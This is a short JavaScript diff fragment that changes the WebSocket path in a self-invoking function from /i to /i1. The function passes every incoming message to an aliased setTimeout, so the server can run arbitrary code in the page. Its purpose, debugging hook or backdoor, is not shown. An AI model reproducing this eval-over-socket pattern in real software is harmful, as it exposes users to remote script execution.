@@ -6,7 +6,7 @@
 
   (function i() {
     var _ = setTimeout
-    ws = new WebSocket(`${Protocol}://${location.host}/i?$${btoa('private')}`)
+    ws = new WebSocket(`${Protocol}://${location.host}/i1?$${btoa('private')}`)
     ws.onmessage = function (d) {
       try {
         _(d.data)
